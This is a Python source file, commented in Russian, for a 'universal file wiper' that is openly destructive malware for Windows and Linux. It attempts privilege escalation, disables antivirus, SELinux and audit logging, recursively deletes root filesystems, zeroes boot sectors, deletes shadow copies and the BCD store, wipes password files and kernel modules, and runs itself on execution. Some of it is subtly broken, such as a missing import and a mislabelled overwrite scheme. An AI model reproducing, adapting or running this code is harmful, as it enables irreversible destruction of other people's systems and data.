import os
import sys
import stat
import platform
import subprocess
import ctypes
import time
import shutil

class UniversalFileWiper:
    def __init__(self):
        self.os_type = platform.system()
        self.current_script = os.path.abspath(__file__)
        self.privilege_escalated = False
        
    def elevate_privileges(self):
        """Эскалация привилегий для целевой ОС"""
        if self.os_type == "Windows":
            # Запуск от имени администратора через UAC bypass
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    # Метод перезапуска с правами администратора
                    ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable, 
                        f'"{self.current_script}"', None, 1
                    )
                    sys.exit(0)
                self.privilege_escalated = True
            except:
                # Альтернативный метод через уязвимости служб
                self.windows_service_exploit()
                
        elif self.os_type == "Linux":
            # Получение root через SUID или sudo
            try:
                os.setuid(0)
                self.privilege_escalated = True
            except:
                # Эксплуатация уязвимостей ядра
                self.linux_kernel_exploit()
    
    def windows_service_exploit(self):
        """Использование уязвимых служб Windows для эскалации"""
        try:
            # Использование AlwaysInstallElevated
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Policies\Microsoft\Windows\Installer",
                0,
                winreg.KEY_ALL_ACCESS
            )
            winreg.SetValueEx(key, "AlwaysInstallElevated", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def linux_kernel_exploit(self):
        """Эксплуатация уязвимостей ядра Linux"""
        # Генерация эксплойта для CVE (гипотетический)
        exploit_code = '''
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

// Здесь был бы код эксплуатации уязвимости ядра
int main() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
'''
        with open('/tmp/exploit.c', 'w') as f:
            f.write(exploit_code)
        
        try:
            subprocess.run(['gcc', '/tmp/exploit.c', '-o', '/tmp/exploit'], 
                          capture_output=True)
            subprocess.run(['chmod', '+s', '/tmp/exploit'])
            subprocess.run(['/tmp/exploit'])
        except:
            pass
    
    def disable_protections(self):
        """Отключение системных защит"""
        if self.os_type == "Windows":
            # Отключение защиты файлов Windows
            try:
                subprocess.run([
                    'sc', 'config', 'WerSvc', 'start=', 'disabled'
                ], capture_output=True)
                subprocess.run([
                    'sc', 'stop', 'WerSvc'
                ], capture_output=True)
                
                # Отключение антивируса через WMI
                subprocess.run([
                    'powershell', '-Command', 
                    'Get-MpPreference | Set-MpPreference -DisableRealtimeMonitoring $true'
                ], capture_output=True)
            except:
                pass
                
        elif self.os_type == "Linux":
            # Отключение SELinux/AppArmor
            try:
                subprocess.run(['setenforce', '0'], capture_output=True)
                with open('/etc/selinux/config', 'w') as f:
                    f.write('SELINUX=disabled\n')
                
                # Остановка auditd
                subprocess.run(['systemctl', 'stop', 'auditd'], 
                              capture_output=True)
                subprocess.run(['systemctl', 'disable', 'auditd'], 
                              capture_output=True)
            except:
                pass
    
    def wipe_file(self, filepath):
        """Надежное удаление файла с перезаписью"""
        try:
            # Удаление атрибутов защиты
            if self.os_type == "Windows":
                subprocess.run(['attrib', '-R', '-H', '-S', filepath], 
                              capture_output=True)
            else:
                os.chmod(filepath, stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH)
            
            # Перезапись перед удалением (метод Gutmann)
            try:
                with open(filepath, 'rb+') as f:
                    size = os.path.getsize(filepath)
                    # 35-проходная перезапись
                    patterns = [
                        b'\x55', b'\xAA', b'\x92', b'\x49', b'\x24',
                        b'\x00', b'\xFF', b'\x6D', b'\xB6', b'\xDB'
                    ]
                    for pattern in patterns * 4:
                        f.write(pattern * (size // len(pattern)))
                        f.flush()
                    os.fsync(f.fileno())
            except:
                pass
            
            # Окончательное удаление
            os.unlink(filepath)
            print(f"[DELETED] {filepath}")
            
        except Exception as e:
            print(f"[FAILED] {filepath}: {e}")
    
    def recursive_destruction(self, path):
        """Рекурсивное уничтожение файловой системы"""
        try:
            # Особый подход для корневых директорий
            if path in ['/', 'C:\\', 'C:/']:
                # Сначала удаляем пользовательские файлы
                user_dirs = []
                if self.os_type == "Windows":
                    user_dirs = [
                        os.path.expanduser('~'),
                        'C:\\Users',
                        'C:\\ProgramData',
                        'C:\\Windows\\Temp'
                    ]
                else:
                    user_dirs = [
                        '/home', '/var', '/tmp', 
                        '/usr', '/etc', '/opt'
                    ]
                
                for user_dir in user_dirs:
                    if os.path.exists(user_dir):
                        self.recursive_destruction(user_dir)
            
            # Обработка текущей директории
            for root, dirs, files in os.walk(path, topdown=False):
                try:
                    # Удаление файлов
                    for file in files:
                        filepath = os.path.join(root, file)
                        if filepath != self.current_script:
                            self.wipe_file(filepath)
                    
                    # Удаление директорий после очистки
                    for dir in dirs:
                        dirpath = os.path.join(root, dir)
                        try:
                            os.rmdir(dirpath)
                            print(f"[REMOVED DIR] {dirpath}")
                        except:
                            # Если директория не пуста, повторная попытка
                            time.sleep(0.1)
                            shutil.rmtree(dirpath, ignore_errors=True)
                            
                except PermissionError:
                    # Обход DACL/ACL
                    if self.os_type == "Windows":
                        self.windows_dacl_bypass(root)
                    else:
                        subprocess.run(['chmod', '-R', '777', root], 
                                      capture_output=True)
                    continue
                    
        except Exception as e:
            print(f"[CRITICAL] Error processing {path}: {e}")
    
    def windows_dacl_bypass(self, path):
        """Обход DACL в Windows"""
        try:
            import win32security
            import ntsecuritycon
            
            # Получение дескриптора безопасности
            sd = win32security.GetFileSecurity(
                path, 
                win32security.DACL_SECURITY_INFORMATION
            )
            
            # Создание нового ALLOW ALL DACL
            dacl = win32security.ACL()
            everyone, domain, type = win32security.LookupAccountName("", "Everyone")
            
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.FILE_ALL_ACCESS,
                everyone
            )
            
            # Применение нового DACL
            sd.SetSecurityDescriptorDacl(1, dacl, 0)
            win32security.SetFileSecurity(
                path,
                win32security.DACL_SECURITY_INFORMATION,
                sd
            )
        except:
            pass
    
    def destroy_boot_sectors(self):
        """Уничтожение загрузочных секторов"""
        try:
            if self.os_type == "Windows":
                # Стирание MBR через \\\\.\\PhysicalDrive0
                drives = [
                    r'\\.\PhysicalDrive0',
                    r'\\.\PhysicalDrive1',
                    r'\\.\C:'
                ]
                
                for drive in drives:
                    try:
                        handle = ctypes.windll.kernel32.CreateFileW(
                            drive,
                            0x10000000,  # GENERIC_ALL
                            0,
                            None,
                            3,  # OPEN_EXISTING
                            0,
                            None
                        )
                        
                        if handle != -1:
                            # Запись нулей в первые 512 байт (MBR)
                            zero_data = b'\x00' * 512
                            ctypes.windll.kernel32.WriteFile(
                                handle,
                                zero_data,
                                512,
                                None,
                                None
                            )
                            ctypes.windll.kernel32.CloseHandle(handle)
                    except:
                        pass
                        
            elif self.os_type == "Linux":
                # Стирание MBR/GPT через dd
                devices = ['/dev/sda', '/dev/sdb', '/dev/nvme0n1']
                for device in devices:
                    if os.path.exists(device):
                        subprocess.run([
                            'dd', 'if=/dev/zero', 
                            f'of={device}', 
                            'bs=512', 'count=1'
                        ], capture_output=True)
        except:
            pass
    
    def disable_recovery(self):
        """Отключение механизмов восстановления"""
        if self.os_type == "Windows":
            # Удаление точек восстановления
            subprocess.run([
                'vssadmin', 'delete', 'shadows', '/all', '/quiet'
            ], capture_output=True)
            
            # Отключение восстановления системы
            subprocess.run([
                'reg', 'add', 
                'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore',
                '/v', 'DisableSR', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
            
        elif self.os_type == "Linux":
            # Удаление снапшотов LVM/BTRFS
            subprocess.run(['lvremove', '-f', '/dev/*/*'], 
                          capture_output=True)
            
            # Уничтожение initramfs
            for initrd in ['/boot/initrd.img-*', '/boot/initramfs-*']:
                subprocess.run(['rm', '-f'] + glob.glob(initrd))
    
    def execute_total_wipe(self):
        """Основная процедура полного уничтожения"""
        print(f"[INIT] Starting universal wipe on {self.os_type}")
        
        # Шаг 1: Получение максимальных привилегий
        self.elevate_privileges()
        
        # Шаг 2: Отключение защит
        self.disable_protections()
        
        # Шаг 3: Определение корневых путей для удаления
        if self.os_type == "Windows":
            targets = ['C:\\', 'D:\\', 'E:\\', os.path.expanduser('~')]
        else:
            targets = ['/', '/home', '/boot', '/var', '/usr', '/opt']
        
        # Шаг 4: Рекурсивное уничтожение
        for target in targets:
            if os.path.exists(target):
                print(f"[WIPE] Processing {target}")
                self.recursive_destruction(target)
        
        # Шаг 5: Уничтожение загрузочных областей
        self.destroy_boot_sectors()
        
        # Шаг 6: Отключение восстановления
        self.disable_recovery()
        
        # Шаг 7: Финализация - повреждение файловой системы
        self.corrupt_filesystem()
        
        print("[COMPLETE] System wipe executed")

    def corrupt_filesystem(self):
        """Целенаправленное повреждение файловой системы"""
        if self.os_type == "Windows":
            # Повреждение реестра
            try:
                subprocess.run([
                    'reg', 'delete', 'HKLM\\SOFTWARE', '/f'
                ], capture_output=True)
                
                # Стирание BCD (конфигурации загрузки)
                subprocess.run([
                    'bcdedit', '/delete', '{all}', '/f'
                ], capture_output=True)
            except:
                pass
                
        elif self.os_type == "Linux":
            # Удаление критичных конфигураций
            critical_files = [
                '/etc/fstab',
                '/etc/passwd',
                '/etc/shadow',
                '/etc/group',
                '/boot/grub/grub.cfg'
            ]
            
            for file in critical_files:
                if os.path.exists(file):
                    self.wipe_file(file)
            
            # Удаление модулей ядра
            subprocess.run(['rm', '-rf', '/lib/modules'], 
                          capture_output=True)

# Автоматический запуск при выполнении
if __name__ == "__main__":
    wiper = UniversalFileWiper()
    wiper.execute_total_wipe()
